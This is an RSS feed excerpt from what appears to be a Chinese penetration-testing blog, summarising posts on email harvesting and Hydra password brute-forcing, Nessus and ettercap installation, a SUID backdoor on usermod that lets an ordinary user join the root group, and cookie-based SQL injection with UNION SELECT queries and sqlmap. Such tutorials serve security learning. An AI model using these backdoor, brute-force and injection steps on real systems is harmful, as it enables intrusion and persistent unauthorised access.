      <title>使用theHarvester得到邮箱</title>
      <link>https://wyb0.com/posts/2016/theharvester-blasting-email/</link>
      <pubDate>Thu, 12 May 2016 15:27:14 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/theharvester-blasting-email/</guid>
      <description> 0x00 软件 使用theHarvester搜集邮箱 使用dnsenum得到邮箱服务器域名 使用nmap查看端口开启情况 使用Hydra进行弱口令猜解  0x01 设置Shadowsocks为全局模式: 0x02 得到邮箱 可在theHarvester下载theHarvester，得到邮箱后做成字典user.txt 0x03 得到邮箱服务器域名 0x04 nmap确认端口开启 0x05 Hydra爆密码 0x06 尝试登陆 </description>
    </item>
    
    <item>
      <title>Nessus 的安装和卸载</title>
      <link>https://wyb0.com/posts/2016/nessus-install-and-remove/</link>
      <pubDate>Wed, 11 May 2016 17:09:10 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/nessus-install-and-remove/</guid>
      <description>0x00 下载 Nessus 的 deb 安装包 去【这里】，选择家庭版，然后下载对应的安装包 0x01 本地安装 Nessus 0x02 执行后续安装步骤:  启动nessus  web访问nessus服务  设置账户和密码  申请code，可以在【这里】申请  去邮箱查找code  将code填入，然后等待插件的下载   0x03 登陆 Nessus 0x03 卸载 Nessus https://docs.tenable.com/nessus/Content/RemoveNessus.htm</description>
    </item>
    
    <item>
      <title>Nmap思维导图</title>
      <link>https://wyb0.com/posts/2016/nmap-mind-mapping/</link>
      <pubDate>Tue, 10 May 2016 20:24:07 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/nmap-mind-mapping/</guid>
      <description> nmap思维导图如下： </description>
    </item>
    
    <item>
      <title>Linux之安装ettercap</title>
      <link>https://wyb0.com/posts/2016/linux-install-ettercap/</link>
      <pubDate>Tue, 19 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-install-ettercap/</guid>
      <description>0x00 准备 操作系统：CentOS 首先，ettercap安装时需要4个依赖包，而且安装包里面也已经提供了 执行：sudo yum groupinstall &amp;quot;Development tools&amp;quot; #源码安装软件就需要安装这个 使用wget下载ettercap源码  0x01 查看需要的依赖项 [wyb@localhost ettercap-0.8.2]$ vim INSTALL #### Bundled libraries Ettercap now bundles the following libraries with the source distribution: libnet 1.1.6 curl 7.41.0 luajit 2.0.3 check 0.9.14 [wyb@localhost ettercap-0.8.2]$ cd bundled_deps/ [wyb@localhost bundled_deps]$ ls check curl libnet luajit  0x02 安装依赖包  安装check
[wyb@localhost check]$ cd check-0.9.14 [wyb@localhost check-0.9.14]$ ls [wyb@localhost check-0.9.14]$ ./configure [wyb@localhost check-0.9.14]$ make [wyb@localhost check-0.</description>
    </item>
    
    <item>
      <title>Linux之SUID后门</title>
      <link>https://wyb0.com/posts/2016/linux-suid-back-door/</link>
      <pubDate>Mon, 18 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-suid-back-door/</guid>
      <description>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制
0x00 为二进制文件添加s权限从而提升为root权限  写sudoers添加用户 //最佳方案
 vim /etc/passwd //将uid和gid改为0 vim /etc/shadow //密文覆盖
 vim root .ssh/证书文件 .ssh这个文件夹和证书的权限要正确，要和原来一致  0x01 SUID主要作用可以是留后门  在root权限下给usermod一个s权限
# which usermod #得到usermod的路径 /usr/sbin/usermod # chmod u+s /usr/sbin/usermod # ls -l /usr/sbin/usermod -rwsr-x---. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  usermod给其他人一个x权限
[root@localhost ~]# chmod o+x /usr/sbin/usermod [root@localhost ~]# ls -l /usr/sbin/usermod -rwsr-x--x. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  切换到普通用户wyb
[wyb@localhost ~]$ id wyb uid=500(wyb) gid=500(wyb) groups=500(wyb) [wyb@localhost ~]$ usermod -g root wyb [wyb@localhost ~]$ id wyb uid=500(wyb) gid=0(root) groups=0(root) [wyb@localhost ~]$ exit  验证</description>
    </item>
    
    <item>
      <title>ASP联合注入(Cookie处)</title>
      <link>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link>
      <pubDate>Fri, 04 Dec 2015 19:42:19 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid>
      <description> 0x00 Cookie注入的使用  三大Web提交方式
 GET：直接在浏览器上面访问地址
 POST：提交表单(会员注册、文件上传等)
 COOKIE：访问网站下面自带的身份验证的值  Cookie注入利用时机
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。  利用方法
 可以利用注入中转 可以利用sqlmap   0x01 用注入中转进行Cookie注入  目标：http://localhost:81/2/shownews.asp?id=183
 打开注入中转这个工具，填入相应参数，然后点击生成ASP，将生成的asp文件(jmCook.asp)放入你自己搭建的网站内后即可进行注入  提交localhost:81/jmCook.asp?jmdcw=183 order by猜测字段数
 提交localhost:81/jmCook.asp?jmdcw=183 UNION SELECT 1,2,3,4 from XXX猜测表名  猜测内容   0x02 用sqlmap进行Cookie注入  sqlmap验证存在Cookie注入  猜表名  猜列名  猜字段内容   </description>
    </item>
    
  </channel>
</rss>